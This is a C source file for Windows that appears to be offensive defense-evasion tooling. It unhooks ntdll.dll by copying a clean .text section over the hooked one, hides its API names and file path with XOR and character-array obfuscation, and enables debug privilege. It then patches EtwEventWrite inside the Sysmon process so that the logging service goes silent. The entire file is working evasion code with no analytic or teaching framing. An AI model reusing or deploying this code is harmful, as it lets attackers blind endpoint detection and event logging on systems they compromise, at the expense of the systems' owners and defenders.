#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "mscoree.lib")

#define ENABLE 1
#define DISABLE 0

typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI * CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * UnmapViewOfFile_t)(LPCVOID);

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };


void XORcrypt(char str2xor[], size_t len, char key) {
/*
        XORcrypt() is a simple XOR encoding/decoding function
*/
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}



int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}



static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
/*
    UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
	int i;

	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
	
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
	
	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) {
					// RWX failed!
					return -1;
			}
			// copy fresh .text section into ntdll memory
			memcpy( (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					(LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					pImgSectionHead->Misc.VirtualSize);

			// restore original protection settings of ntdll memory
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) {
					// it failed
					return -1;
			}
			return 0;
		}
	}

	// failed? .text not found!
	return -1;
}




BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("OpenProcessToken() failed!\n");
		return FALSE;
	}

    if ( !LookupPrivilegeValue( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid ) )        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if ( !AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { 
          printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
          return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
          printf("The token does not have the specified privilege.\n");
          return FALSE;
    } 

    return TRUE;
}



int GagSysmon(HANDLE hProc) {

	HANDLE hThread = NULL;
	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	
	void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);
#ifdef _WIN64
	// xor rax, rax; ret
	char patch[] = "\x48\x33\xc0\xc3";
#else
	// xor eax, eax; ret 14
	char patch[] = "\x33\xc0\xc2\x14\x00";
#endif

	WriteProcessMemory(hProc, pEventWrite, (PVOID) patch, (SIZE_T) sizeof(patch), (SIZE_T *) NULL);
	FlushInstructionCache(hProc, pEventWrite, 4096);

	return 0;
}


int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };

	unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
	unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
	unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };

	unsigned int sNtdllPath_len = sizeof(sNtdllPath);
	unsigned int sNtdll_len = sizeof(sNtdll);
	int ret = 0;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID pMapping;
	
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);
	
	// open ntdll.dll
	XORcrypt((char *) sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
	hFile = CreateFile((LPCSTR) sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( hFile == INVALID_HANDLE_VALUE ) {
			// failed to open ntdll.dll
			return -1;
	}

	// prepare file mapping
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (! hFileMapping) {
			// file mapping failed

			CloseHandle(hFile);
			return -1;
	}
	
	// map the bastard
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
					// mapping failed
					CloseHandle(hFileMapping);
					CloseHandle(hFile);
					return -1;
	}
	
	// remove hooks
	ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pMapping);

	// Clean up.
	UnmapViewOfFile_p(pMapping);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);


	pid = FindTarget("onedrv.exe");

	if (!SetPrivilege(SE_DEBUG_NAME, ENABLE))
		return -1;

	if (pid) {
		//printf("Sysmon PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			printf("Killing Sysmon...");
			GagSysmon(hProc);
			printf("done!\n");
			CloseHandle(hProc);
		}
	}

	return 0;
}
